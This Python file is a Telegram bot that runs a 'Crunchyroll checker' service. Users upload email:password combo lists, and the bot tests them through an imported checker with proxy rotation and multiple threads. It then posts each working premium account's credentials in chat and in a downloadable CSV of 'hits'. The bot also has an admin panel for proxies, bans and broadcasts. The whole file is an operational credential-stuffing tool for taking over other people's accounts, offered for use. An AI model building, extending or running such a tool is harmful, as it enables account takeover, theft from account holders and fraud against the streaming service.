#!/usr/bin/env python3
import asyncio
import io
import csv
import datetime
import os
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

import config
from database import Database
from checker import CrunchyrollChecker

print("🔄 Cleaning up old webhooks...")
try:
    webhook_url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/deleteWebhook"
    response = requests.get(webhook_url, timeout=10)
    print("✅ Webhook deleted")
except Exception as e:
    print(f"⚠️ Webhook error: {e}")

print("🚀 LOADING BOT...")
print(f"👑 Admins: {config.ADMIN_IDS}")

db = Database()
os.makedirs("data/exports", exist_ok=True)

# ============= KEYBOARDS =============
def main_menu(user_id):
    keyboard = [
        [InlineKeyboardButton("🍣 CHECK CRUNCHYROLL 🍣", callback_data="check_crunchyroll")],
        [InlineKeyboardButton("📧 HOTMAIL CHECKER", callback_data="hotmail_checker")],
        [InlineKeyboardButton("📊 MY STATS", callback_data="my_stats"),
         InlineKeyboardButton("📜 MY HISTORY", callback_data="my_history")],
        [InlineKeyboardButton("❓ HELP", callback_data="help"),
         InlineKeyboardButton("📞 SUPPORT", callback_data="support")]
    ]
    if user_id in config.ADMIN_IDS:
        keyboard.append([InlineKeyboardButton("👑 ADMIN PANEL 👑", callback_data="admin_panel")])
    return InlineKeyboardMarkup(keyboard)

def admin_panel_menu():
    keyboard = [
        [InlineKeyboardButton("📊 STATISTICS", callback_data="admin_stats"),
         InlineKeyboardButton("👥 ALL USERS", callback_data="admin_users")],
        [InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast"),
         InlineKeyboardButton("🔌 MANAGE PROXIES", callback_data="admin_proxies")],
        [InlineKeyboardButton("🚫 BAN USER", callback_data="admin_ban"),
         InlineKeyboardButton("✅ UNBAN USER", callback_data="admin_unban")],
        [InlineKeyboardButton("🔙 BACK TO MAIN", callback_data="back_to_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def proxy_menu():
    keyboard = [
        [InlineKeyboardButton("➕ ADD PROXY", callback_data="proxy_add"),
         InlineKeyboardButton("📋 LIST PROXIES", callback_data="proxy_list")],
        [InlineKeyboardButton("🗑 DELETE PROXY", callback_data="proxy_delete")],
        [InlineKeyboardButton("🔙 BACK TO ADMIN", callback_data="admin_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def back_button():
    keyboard = [[InlineKeyboardButton("🔙 BACK TO MAIN MENU", callback_data="back_to_main")]]
    return InlineKeyboardMarkup(keyboard)

# ============= BOT HANDLERS =============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db.add_user(user.id, user.username, user.first_name)
    if user.id in config.ADMIN_IDS:
        db.make_admin(user.id)
    
    welcome_msg = """
╔══════════════════════════════════════╗
║   🎬 CRUNCHYROLL CHECKER BOT v2.0   ║
╚══════════════════════════════════════╝

✨ FEATURES:
├─ Multi-threaded account checking
├─ Proxy rotation support
├─ Live percentage updates
├─ CSV export with full details
├─ Admin panel
└─ 24/7 uptime

📤 HOW TO USE:
Click CHECK CRUNCHYROLL and upload a .txt file

📝 FORMAT: email:password (one per line)

Welcome! 👋
"""
    await update.message.reply_text(welcome_msg, reply_markup=main_menu(user.id), parse_mode="Markdown")

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    data = query.data
    
    if db.is_banned(user_id) and data not in ["support", "help"]:
        await query.edit_message_text("❌ YOU ARE BANNED!", reply_markup=back_button())
        return
    
    if data == "back_to_main":
        await query.edit_message_text("Main Menu:", reply_markup=main_menu(user_id))
    
    elif data == "check_crunchyroll":
        await query.edit_message_text(
            "📤 **UPLOAD YOUR COMBO FILE**\n\nSend a .txt file with email:password format\n\nClick BACK to cancel.",
            parse_mode="Markdown",
            reply_markup=back_button()
        )
        context.user_data['waiting_for_file'] = True
    
    elif data == "hotmail_checker":
        await query.edit_message_text("📧 HOTMAIL CHECKER\n\n🚧 COMING SOON!", parse_mode="Markdown", reply_markup=back_button())
    
    elif data == "my_stats":
        user_data = db.get_user(user_id)
        if user_data:
            hit_rate = ((user_data[7] or 0) / (user_data[6] or 1) * 100)
            stats_text = f"📊 YOUR STATISTICS\n\n├─ Total checks: {user_data[6] or 0}\n├─ Total hits: {user_data[7] or 0}\n├─ Hit rate: {hit_rate:.1f}%\n└─ Checks today: {user_data[8] or 0}"
            await query.edit_message_text(stats_text, parse_mode="Markdown", reply_markup=back_button())
        else:
            await query.edit_message_text("No data found!", reply_markup=back_button())
    
    elif data == "my_history":
        logs = db.get_user_logs(user_id)
        if logs:
            history_text = "📜 YOUR CHECK HISTORY\n\n"
            for log in logs[:10]:
                history_text += f"📁 {log[0]}\n   ├─ {log[1]} accounts\n   └─ ✅ {log[2]} hits\n\n"
            await query.edit_message_text(history_text, parse_mode="Markdown", reply_markup=back_button())
        else:
            await query.edit_message_text("No history found!", reply_markup=back_button())
    
    elif data == "help":
        help_text = "❓ HOW TO USE\n\n1️⃣ Click CHECK CRUNCHYROLL\n2️⃣ Upload .txt file\n3️⃣ Watch percentage update\n4️⃣ Get premium accounts instantly\n5️⃣ Download CSV with all hits"
        await query.edit_message_text(help_text, parse_mode="Markdown", reply_markup=back_button())
    
    elif data == "support":
        await query.edit_message_text("📞 Contact your bot administrator.", reply_markup=back_button())
    
    elif data == "admin_panel" and user_id in config.ADMIN_IDS:
        await query.edit_message_text("👑 ADMIN PANEL", parse_mode="Markdown", reply_markup=admin_panel_menu())
    
    elif data == "admin_stats" and user_id in config.ADMIN_IDS:
        stats = db.get_stats()
        stats_text = f"📊 BOT STATISTICS\n\n├─ Users: {stats['total_users']}\n├─ Checks: {stats['total_checks']}\n├─ Hits: {stats['total_hits']}\n├─ Hit rate: {stats['hit_rate']:.2f}%\n└─ Active today: {stats['active_today']}"
        await query.edit_message_text(stats_text, parse_mode="Markdown", reply_markup=admin_panel_menu())
    
    elif data == "admin_users" and user_id in config.ADMIN_IDS:
        users = db.get_all_users()
        text = "👥 USERS\n\n"
        for u in users[:20]:
            status = "🚫 BANNED" if u[5] else "✅ ACTIVE"
            text += f"🆔 {u[0]} | {u[1] or 'No name'} | Checks: {u[3]} | {status}\n"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=admin_panel_menu())
    
    elif data == "admin_broadcast" and user_id in config.ADMIN_IDS:
        await query.edit_message_text("📢 Send message to broadcast:", reply_markup=admin_panel_menu())
        context.user_data['broadcast_mode'] = True
    
    elif data == "admin_proxies" and user_id in config.ADMIN_IDS:
        await query.edit_message_text("🔌 PROXY MANAGEMENT\n\nFormat: ip:port or ip:port:user:pass", reply_markup=proxy_menu())
    
    elif data == "admin_ban" and user_id in config.ADMIN_IDS:
        await query.edit_message_text("🚫 Send user ID to ban:", reply_markup=admin_panel_menu())
        context.user_data['ban_mode'] = True
    
    elif data == "admin_unban" and user_id in config.ADMIN_IDS:
        await query.edit_message_text("✅ Send user ID to unban:", reply_markup=admin_panel_menu())
        context.user_data['unban_mode'] = True
    
    elif data == "proxy_add" and user_id in config.ADMIN_IDS:
        await query.edit_message_text("➕ Send proxy (ip:port):", reply_markup=proxy_menu())
        context.user_data['add_proxy_mode'] = True
    
    elif data == "proxy_list" and user_id in config.ADMIN_IDS:
        proxies = db.get_proxies()
        if proxies:
            text = "🔌 PROXIES\n\n"
            for i, p in enumerate(proxies[:20], 1):
                text += f"{i}. {p}\n"
        else:
            text = "No proxies found."
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=proxy_menu())
    
    elif data == "proxy_delete" and user_id in config.ADMIN_IDS:
        await query.edit_message_text("🗑 Send proxy to delete:", reply_markup=proxy_menu())
        context.user_data['delete_proxy_mode'] = True

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not context.user_data.get('waiting_for_file'):
        await update.message.reply_text("❌ Click CHECK CRUNCHYROLL button first!", reply_markup=main_menu(user_id))
        return
    
    if db.is_banned(user_id):
        await update.message.reply_text("❌ You are banned!", reply_markup=main_menu(user_id))
        return
    
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Upload .txt file!", reply_markup=main_menu(user_id))
        return
    
    status_msg = await update.message.reply_text("📥 Downloading file...")
    
    file = await document.get_file()
    file_content = await file.download_as_bytearray()
    lines = file_content.decode('utf-8', errors='ignore').split('\n')
    
    accounts = []
    for line in lines:
        line = line.strip()
        if line and ':' in line and not line.startswith('#'):
            parts = line.split(':', 1)
            accounts.append((parts[0].strip(), parts[1].strip()))
    
    if not accounts:
        await status_msg.edit_text("❌ No valid accounts found!", reply_markup=main_menu(user_id))
        return
    
    total = len(accounts)
    await status_msg.edit_text(f"✅ Loaded {total} accounts!\n\n🔄 Starting check...")
    
    proxies = db.get_proxies()
    checker = CrunchyrollChecker(
        proxies=proxies if proxies else None,
        threads=config.DEFAULT_THREADS
    )
    
    progress_msg = await update.message.reply_text(
        f"🔄 CHECKING IN PROGRESS\n\n📊 Progress: 0% (0/{total})\n🎯 Premium Found: 0",
        parse_mode="Markdown"
    )
    
    hits_list = []
    
    def on_progress(current, total_accounts, result):
        asyncio.create_task(update_progress_async(current, total_accounts, result))
    
    async def update_progress_async(current, total_accounts, result):
        if result['success']:
            hits_list.append(result)
            hit_msg = f"""
🎯 PREMIUM ACCOUNT FOUND!

📧 {result['email']}
🔑 {result['password']}
💎 Plan: {result['plan']}
🌍 Country: {result['country']}
📅 Renewal: {result['renewal'] or 'N/A'}

{result['email']}:{result['password']}
"""
            await update.message.reply_text(hit_msg, parse_mode="Markdown")
        
        percent = int((current / total_accounts) * 100)
        
        if current % 10 == 0 or current == total_accounts:
            try:
                await progress_msg.edit_text(
                    f"🔄 CHECKING IN PROGRESS\n\n"
                    f"📊 Progress: {percent}% ({current}/{total_accounts})\n"
                    f"🎯 Premium Found: {len(hits_list)}",
                    parse_mode="Markdown"
                )
            except:
                pass
    
    checker.set_progress_callback(on_progress)
    results, hits = checker.check_accounts(accounts)
    
    db.update_stats(user_id, total, len(hits))
    db.add_log(user_id, document.file_name, total, len(hits))
    context.user_data['waiting_for_file'] = False
    
    if hits:
        timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        csv_buffer = io.StringIO()
        writer = csv.writer(csv_buffer)
        writer.writerow(['Email', 'Password', 'Plan', 'Country', 'Renewal Date'])
        for hit in hits:
            writer.writerow([hit['email'], hit['password'], hit['plan'], hit['country'], hit['renewal']])
        csv_buffer.seek(0)
        
        final_msg = f"""
🎯 CHECK COMPLETE!

📊 FINAL SUMMARY:
├─ Total Checked: {total}
├─ ✅ Premium Accounts: {len(hits)}
├─ ❌ Free/Invalid: {total - len(hits)}
└─ 📈 Hit Rate: {(len(hits)/total*100):.1f}%

🏆 Premium accounts saved to CSV file below!
"""
        await progress_msg.delete()
        await update.message.reply_text(final_msg, parse_mode="Markdown")
        await update.message.reply_document(
            document=io.BytesIO(csv_buffer.getvalue().encode('utf-8')),
            filename=f"crunchyroll_hits_{timestamp}.csv",
            caption=f"✅ {len(hits)} premium accounts with full details!"
        )
    else:
        await progress_msg.edit_text(
            f"❌ NO PREMIUM ACCOUNTS FOUND!\n\n📊 Total Checked: {total}",
            parse_mode="Markdown"
        )
    
    await update.message.reply_text("Main Menu:", reply_markup=main_menu(user_id))

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if text == "/cancel":
        context.user_data.clear()
        await update.message.reply_text("✅ Cancelled!", reply_markup=main_menu(user_id))
        return
    
    if context.user_data.get('broadcast_mode') and user_id in config.ADMIN_IDS:
        users = db.get_all_users()
        sent = 0
        status_msg = await update.message.reply_text("📢 Sending broadcast...")
        for user in users:
            try:
                await context.bot.send_message(user[0], f"📢 BROADCAST\n\n{text}", parse_mode="Markdown")
                sent += 1
                await asyncio.sleep(0.05)
            except:
                pass
        await status_msg.edit_text(f"✅ Sent to {sent}/{len(users)} users!")
        context.user_data.pop('broadcast_mode', None)
        await update.message.reply_text("Admin Panel:", reply_markup=admin_panel_menu())
        return
    
    if context.user_data.get('ban_mode') and user_id in config.ADMIN_IDS:
        try:
            target_id = int(text)
            db.ban_user(target_id)
            await update.message.reply_text(f"✅ User {target_id} BANNED!")
        except:
            await update.message.reply_text("❌ Invalid user ID!")
        context.user_data.pop('ban_mode', None)
        await update.message.reply_text("Admin Panel:", reply_markup=admin_panel_menu())
        return
    
    if context.user_data.get('unban_mode') and user_id in config.ADMIN_IDS:
        try:
            target_id = int(text)
            db.unban_user(target_id)
            await update.message.reply_text(f"✅ User {target_id} UNBANNED!")
        except:
            await update.message.reply_text("❌ Invalid user ID!")
        context.user_data.pop('unban_mode', None)
        await update.message.reply_text("Admin Panel:", reply_markup=admin_panel_menu())
        return
    
    if context.user_data.get('add_proxy_mode') and user_id in config.ADMIN_IDS:
        if db.add_proxy(text):
            await update.message.reply_text(f"✅ Proxy added: {text}")
        else:
            await update.message.reply_text("❌ Invalid or duplicate proxy!")
        context.user_data.pop('add_proxy_mode', None)
        await update.message.reply_text("Proxy Menu:", reply_markup=proxy_menu())
        return
    
    if context.user_data.get('delete_proxy_mode') and user_id in config.ADMIN_IDS:
        db.delete_proxy(text)
        await update.message.reply_text(f"✅ Proxy deleted: {text}")
        context.user_data.pop('delete_proxy_mode', None)
        await update.message.reply_text("Proxy Menu:", reply_markup=proxy_menu())
        return
    
    await update.message.reply_text("Please use BUTTONS below 👇", reply_markup=main_menu(user_id))

async def main():
    print("🤖 Bot starting...")
    if not config.BOT_TOKEN:
        print("❌ No BOT_TOKEN!")
        return
    
    app = Application.builder().token(config.BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(handle_callback))
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    print("✅ BOT RUNNING! Send /start on Telegram")
    
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())